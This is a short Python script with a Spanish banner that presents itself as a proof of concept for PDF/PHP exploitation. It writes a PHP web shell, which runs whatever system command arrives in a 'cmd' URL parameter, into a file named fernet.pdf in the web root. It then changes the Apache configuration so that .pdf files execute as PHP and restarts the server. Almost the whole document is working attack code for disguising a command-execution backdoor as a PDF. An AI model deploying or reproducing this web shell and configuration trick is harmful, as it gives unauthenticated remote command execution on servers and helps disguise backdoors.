import os

# Banner ASCII
banner = """
 ███████████                             ██████████            ███████████                                         █████
░░███░░░░░███                           ░░███░░░░███          ░░███░░░░░░█                                        ░░███
 ░███    ░███  ██████   ██████   ██████  ░███   ░░███  ██████  ░███   █ ░   ██████  ████████  ████████    ██████  ███████
 ░██████████  ███░░███ ███░░███ ███░░███ ░███    ░███ ███░░███ ░███████    ███░░███░░███░░███░░███░░███  ███░░███░░░███░
 ░███░░░░░░  ░███ ░███░███ ░░░ ░███ ░███ ░███    ░███░███████  ░███░░░█   ░███████  ░███ ░░░  ░███ ░███ ░███████   ░███
 ░███        ░███ ░███░███  ███░███ ░███ ░███    ███ ░███░░░   ░███  ░    ░███░░░   ░███      ░███ ░███ ░███░░░    ░███ ███
 █████       ░░██████ ░░██████ ░░██████  ██████████  ░░██████  █████      ░░██████  █████     ████ █████░░██████   ░░█████
░░░░░         ░░░░░░   ░░░░░░   ░░░░░░  ░░░░░░░░░░    ░░░░░░  ░░░░░        ░░░░░░  ░░░░░     ░░░░ ░░░░░  ░░░░░░     ░░░░░

 El siguiente script permite levantar un entorno para generar la PoC
de explotación de vulnerabilidades de PDF y PHP, generando una shell
reversa accesible por medio de un PDF que se puede alojar en un servidor.
Realizado por Un Hacker En Capital
"""

print(banner)

# PHP code with adjusted header and layout
php_code = """-*-* PocoDeFernet -*-*

<?php
echo '<html><body><form method="GET" name="'. basename($_SERVER['PHP_SELF']) .'">';
echo '<input type="text" name="cmd" autofocus id="cmd"><br><br>';
if (isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd'] . ' 2>&1');
    echo '</pre>';
}
echo '</body></html>';
__halt_compiler();
?>
"""

pdf_path = "/var/www/html/fernet.pdf"

# Write the PHP code into the PDF file
with open(pdf_path, "w") as pdf_file:
    pdf_file.write(php_code)

# Install Apache2 if not installed
os.system("sudo apt-get update && sudo apt-get install -y apache2")

# Add the PHP handler for .pdf in Apache config
apache_conf = "/etc/apache2/apache2.conf"
add_type_line = "AddType application/x-httpd-php .pdf"
with open(apache_conf, "a") as conf_file:
    conf_file.write(f"\n{add_type_line}\n")

# Restart Apache2
os.system("sudo systemctl restart apache2")

# Get the IPv4 address of the machine
ip_address = os.popen("hostname -I | awk '{print $1}'").read().strip()

# Display the final message
final_message = f"""
\033[42m\033[30m
Puede ingresar a: http://{ip_address}/fernet.pdf
\033[0m
Y Recuerda no mezclar Fernet con PDF !!
"""
print(final_message)
